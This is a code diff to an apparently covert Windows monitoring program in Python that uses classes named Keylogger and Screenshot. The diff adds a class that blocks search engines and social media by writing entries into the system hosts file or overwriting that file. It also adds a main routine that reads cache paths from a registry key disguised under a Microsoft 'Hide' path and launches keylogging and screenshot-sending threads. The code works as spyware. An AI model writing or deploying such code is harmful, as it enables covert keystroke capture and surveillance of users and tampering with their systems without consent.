@@ -112,6 +112,7 @@ class WinRegistry:
         except:
             pass
 
+
 class Util:
     def create_folder(self, path):
         try:  # Intenta crear la dirección
@@ -165,6 +166,7 @@ class Util:
         file = open(path, mode)
         file.write(text)
         file.close()
+
 
 class Keylogger:
     def __init__(self):
@@ -432,6 +434,124 @@ class Screenshot:
             self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
             self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
             time.sleep(self.__interval)
-if __name__ == '__main__':
+         
 
-    pass
+class WebsiteBlock:
+    def __init__(self):
+        self.hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
+        self.pathListWeb = r"list websites.txt"
+        self.hostsTextOriginal = "" \
+                                 "# Copyright (c) 1993-2009 Microsoft Corp.\n" \
+                                 "#\n" \
+                                 "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n" \
+                                 "#\n" \
+                                 "# This file contains the mappings of IP addresses to host names. Each\n" \
+                                 "# entry should be kept on an individual line. The IP address should\n" \
+                                 "# be placed in the first column followed by the corresponding host name.\n" \
+                                 "# The IP address and the host name should be separated by at least one\n" \
+                                 "# space.\n" \
+                                 "#\n" \
+                                 "# Additionally, comments (such as these) may be inserted on individual\n" \
+                                 "# lines or following the machine name denoted by a '#' symbol.\n" \
+                                 "#\n" \
+                                 "# For example:\n" \
+                                 "#\n" \
+                                 "#      102.54.94.97     rhino.acme.com          # source server\n" \
+                                 "#       38.25.63.10     x.acme.com              # x client host\n" \
+                                 "\n" \
+                                 "# localhost name resolution is handled within DNS itself.\n" \
+                                 "#	127.0.0.1       localhost\n" \
+                                 "#	::1             localhost"
+        self.listWebs =  "www.gogle.com\n"\
+                         "www.wikipedia.com\n"\
+                         "www.bing.com\n"\
+                         "www.es.yahoo.com\n"\
+                         "www.altavista.com\n"\
+                         "www.ask.com\n"\
+                         "www.gigablast.com\n"\
+                         "www.excite.com\n"\
+                         "www.lycos.com\n"\
+                         "www.wolframalpha.com\n"\
+                         "http://zanran.com/q/\n"\
+                         "www.quandl.com\n"\
+                         "www.factbites.com\n"\
+                         "ww.nationmaster.com\n"\
+                         "www.facebook.com\n"\
+                         "www.Instagram.com\n"\
+                         "www.twiter.com\n"\
+                         "www.tiktok.com\n"\
+                         "www.youtube.com\n"\
+                         "www.wechat.com\n"\
+                         "www.linkedln.com\n"\
+                         "www.skype.com\n"\
+                         "www.snapchat.com\n"\
+                         "www.pinterest.com\n"\
+                         "www.whatsapp.com\n"\
+                         "www.reddit.com\n"
+        # self.hostsPath = r"test.txt"
+
+    def __read_file(self, path):
+        content = ""
+        file = open(path, "r")
+        for l in file.readlines():
+            content += l
+        file.close()
+        return content
+
+    def __write_file(self, text, split=True, type="a"):
+        file = open(self.hostsPath, type)
+        try:
+            for t in text.split("\n"):
+                file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
+        except:
+            print("Falló el split")
+            # file.write(text)
+        file.close()
+
+    def __rewrite_file(self, text):
+        self.__write_file(text, False, "w")
+        print("Se restauró archivo Hosts File")
+
+    def __delete_file(self, path):
+        try:
+            os.remove(path)
+        except:
+            pass
+
+    """
+    def __backup(self,path1, path2):
+        try:
+            self.__delete_file(path1)
+            shutil.copy(path1, path2)
+            print("Backup - Sucess ")
+        except:
+            print("Backup - there was mistake error ")
+    """
+
+    def block(self):
+        print("Se bloquearon las siguientes paginas webs:")
+        # webs = self.__read_file(self.pathListWeb)
+        webs = self.listWebs
+        print(webs)
+        self.__write_file(webs)
+
+    def unlock(self):
+        self.__rewrite_file(self.hostsTextOriginal)
+
+    def reset(self):
+        self.unlock()
+
+if __name__ == '__main__':
+    folders = [
+        # str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('path')),
+        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path'))
+    ]
+    for f in folders:
+        Util().delete_folder(f)  # Remove foldes and files // Cache
+        Util().create_folder(f)  # Create folders for cache
+
+    time.sleep(1)
+    # Eliminar todas las carpetas
+    threading.Thread(target=Keylogger().listen_key).start()
+    threading.Thread(target=Screenshot().send).start()
+
